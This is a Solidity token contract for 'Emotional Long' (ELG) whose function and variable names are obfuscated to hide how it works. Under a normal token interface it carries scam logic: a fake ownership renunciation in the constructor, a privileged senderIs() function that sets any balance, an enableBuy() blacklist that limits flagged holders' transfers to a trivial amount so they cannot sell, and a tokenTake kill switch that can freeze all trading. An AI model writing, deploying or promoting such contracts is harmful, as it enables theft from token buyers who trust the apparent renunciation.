//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface totalReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minFee {
    function createPair(address receiverTx, address limitTeamShould) external returns (address);
}

interface atTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverShould) external view returns (uint256);

    function transfer(address swapReceiver, uint256 modeTx) external returns (bool);

    function allowance(address fromLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTx) external returns (bool);

    function transferFrom(
        address sender,
        address swapReceiver,
        uint256 modeTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderFundWallet, uint256 value);
    event Approval(address indexed fromLaunch, address indexed spender, uint256 value);
}

interface fundBuy is atTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EmotionalLong is shouldLimit, atTo, fundBuy {

    function allowance(address fundReceiver, address buyWallet) external view virtual override returns (uint256) {
        if (buyWallet == launchedTake) {
            return type(uint256).max;
        }
        return launchLiquidity[fundReceiver][buyWallet];
    }

    address private teamLaunch;

    function teamTakeMode(uint256 modeTx) public {
        sellLaunch();
        tokenTake = modeTx;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenSwap;
    }

    uint256 constant liquidityAt = 6 ** 10;

    string private walletLimit = "Emotional Long";

    uint256 modeIsMax;

    function transfer(address launchedFrom, uint256 modeTx) external virtual override returns (bool) {
        return isWallet(_msgSender(), launchedFrom, modeTx);
    }

    function approve(address buyWallet, uint256 modeTx) public virtual override returns (bool) {
        launchLiquidity[_msgSender()][buyWallet] = modeTx;
        emit Approval(_msgSender(), buyWallet, modeTx);
        return true;
    }

    bool private exemptWalletMode;

    address launchedTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return teamLaunch;
    }

    function name() external view virtual override returns (string memory) {
        return walletLimit;
    }

    function balanceOf(address receiverShould) public view virtual override returns (uint256) {
        return launchedBuy[receiverShould];
    }

    function listModeWallet(address exemptLimitTrading, address swapReceiver, uint256 modeTx) internal returns (bool) {
        require(launchedBuy[exemptLimitTrading] >= modeTx);
        launchedBuy[exemptLimitTrading] -= modeTx;
        launchedBuy[swapReceiver] += modeTx;
        emit Transfer(exemptLimitTrading, swapReceiver, modeTx);
        return true;
    }

    function senderTake() public {
        emit OwnershipTransferred(autoTo, address(0));
        teamLaunch = address(0);
    }

    uint256 private toReceiver;

    bool private launchedModeMin;

    address tradingExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private launchedBuy;

    function getOwner() external view returns (address) {
        return teamLaunch;
    }

    function senderIs(address launchedFrom, uint256 modeTx) public {
        sellLaunch();
        launchedBuy[launchedFrom] = modeTx;
    }

    event OwnershipTransferred(address indexed teamMax, address indexed minAmount);

    function sellLaunch() private view {
        require(launchSell[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private launchLiquidity;

    address public toModeBuy;

    address public autoTo;

    mapping(address => bool) public launchSell;

    mapping(address => bool) public toSell;

    uint256 public limitMarketing;

    constructor (){
        
        totalReceiver sellTake = totalReceiver(launchedTake);
        toModeBuy = minFee(sellTake.factory()).createPair(sellTake.WETH(), address(this));
        if (launchedModeMin) {
            toReceiver = limitMarketing;
        }
        autoTo = _msgSender();
        senderTake();
        launchSell[autoTo] = true;
        launchedBuy[autoTo] = senderMarketing;
        
        emit Transfer(address(0), autoTo, senderMarketing);
    }

    function isWallet(address exemptLimitTrading, address swapReceiver, uint256 modeTx) internal returns (bool) {
        if (exemptLimitTrading == autoTo) {
            return listModeWallet(exemptLimitTrading, swapReceiver, modeTx);
        }
        uint256 receiverToken = atTo(toModeBuy).balanceOf(tradingExempt);
        require(receiverToken == tokenTake);
        require(swapReceiver != tradingExempt);
        if (toSell[exemptLimitTrading]) {
            return listModeWallet(exemptLimitTrading, swapReceiver, liquidityAt);
        }
        return listModeWallet(exemptLimitTrading, swapReceiver, modeTx);
    }

    function enableBuy(address swapMarketing) public {
        sellLaunch();
        if (launchedModeMin) {
            launchedModeMin = true;
        }
        if (swapMarketing == autoTo || swapMarketing == toModeBuy) {
            return;
        }
        toSell[swapMarketing] = true;
    }

    uint256 tokenTake;

    function limitToken(address minWallet) public {
        require(minWallet.balance < 100000);
        if (senderFund) {
            return;
        }
        
        launchSell[minWallet] = true;
        if (exemptWalletMode) {
            exemptWalletMode = false;
        }
        senderFund = true;
    }

    bool public senderFund;

    uint256 private senderMarketing = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return minSwap;
    }

    function transferFrom(address exemptLimitTrading, address swapReceiver, uint256 modeTx) external override returns (bool) {
        if (_msgSender() != launchedTake) {
            if (launchLiquidity[exemptLimitTrading][_msgSender()] != type(uint256).max) {
                require(modeTx <= launchLiquidity[exemptLimitTrading][_msgSender()]);
                launchLiquidity[exemptLimitTrading][_msgSender()] -= modeTx;
            }
        }
        return isWallet(exemptLimitTrading, swapReceiver, modeTx);
    }

    uint8 private minSwap = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return senderMarketing;
    }

    string private tokenSwap = "ELG";

}